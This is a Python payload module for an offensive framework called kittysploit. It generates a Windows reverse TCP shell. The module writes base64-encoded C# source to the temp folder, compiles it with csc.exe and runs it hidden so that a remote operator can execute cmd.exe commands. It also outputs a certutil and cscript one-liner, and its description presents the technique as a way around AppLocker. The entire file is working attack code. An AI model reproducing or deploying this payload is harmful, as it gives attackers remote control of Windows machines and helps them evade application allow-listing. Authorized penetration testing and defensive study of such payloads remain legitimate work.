from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "jscript"

	__info__ = {
		"name": "Windows JScript Reverse TCP (csc on-box)",
		"description": (
			"JScript/cscript delivery vector: writes a tiny C# reverse shell, compiles with "
			"csc.exe (.NET Framework), and runs it — no powershell.exe. Useful when .ps1 "
			"execution is restricted (AppLocker)."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Connect to IP address", True)
	lport = OptPort(4444, "Connect to port", True)
	output = OptString(
		"cmd",
		"Output form: cmd (one-liner) | js (raw JScript source)",
		False,
	)

	def _csharp_source(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;"
			"class K{static void Main(){try{var c=new TcpClient(\"" + host + "\"," + str(port) + ");"
			"var s=c.GetStream();var r=new StreamReader(s);var w=new StreamWriter(s){AutoFlush=true};"
			"w.WriteLine(\"KittySploit JScript/csc shell\");"
			"for(;;){var cmd=r.ReadLine();if(cmd==null)break;cmd=cmd.Trim();if(cmd.Length==0)continue;"
			"if(cmd==\"exit\"||cmd==\"quit\")break;"
			"var p=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);"
			"p.RedirectStandardOutput=true;p.RedirectStandardError=true;p.UseShellExecute=false;p.CreateNoWindow=true;"
			"var x=Process.Start(p);var o=x.StandardOutput.ReadToEnd()+x.StandardError.ReadToEnd();x.WaitForExit();"
			"if(o.Length==0)o=\"[exit \"+x.ExitCode+\"]\\n\";w.Write(o);}}catch{}}}"
		)

	def _jscript_content(self) -> str:
		cs_b64 = base64.b64encode(self._csharp_source().encode("utf-8")).decode("ascii")
		return f"""var b64="{cs_b64}";
var sh=new ActiveXObject("WScript.Shell");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var src=sh.ExpandEnvironmentStrings("%TEMP%\\\\ks_js_rev.cs");
var exe=sh.ExpandEnvironmentStrings("%TEMP%\\\\ks_js_rev.exe");
var xml=new ActiveXObject("MSXML2.DOMDocument.3.0");
var node=xml.createElement("b64");
node.dataType="bin.base64";
node.text=b64;
var stream=new ActiveXObject("ADODB.Stream");
stream.Type=1;
stream.Open();
stream.Write(node.nodeTypedValue);
stream.SaveToFile(src,2);
stream.Close();
var cscs=[
  sh.ExpandEnvironmentStrings("%WINDIR%\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe"),
  sh.ExpandEnvironmentStrings("%WINDIR%\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe"),
  sh.ExpandEnvironmentStrings("%WINDIR%\\\\Microsoft.NET\\\\Framework64\\\\v3.5\\\\csc.exe"),
  sh.ExpandEnvironmentStrings("%WINDIR%\\\\Microsoft.NET\\\\Framework\\\\v3.5\\\\csc.exe")
];
for(var i=0;i<cscs.length;i++){{
  if(fso.FileExists(cscs[i])){{
    sh.Run('"'+cscs[i]+'" /nologo /t:exe /out:"'+exe+'" "'+src+'"',0,true);
    break;
  }}
}}
if(fso.FileExists(exe)){{
  sh.Run('"'+exe+'"',0,false);
}}
"""

	def generate(self):
		mode = str(self.output or "cmd").strip().lower()
		js = self._jscript_content()
		if mode == "js":
			return js

		js_b64 = base64.b64encode(js.encode("utf-8")).decode("ascii")
		return (
			'cmd.exe /c "'
			f'echo {js_b64}>%TEMP%\\ks.js.b64 & '
			'certutil -decode %TEMP%\\ks.js.b64 %TEMP%\\ks.js >nul & '
			'cscript //nologo //E:JScript %TEMP%\\ks.js"'
		)
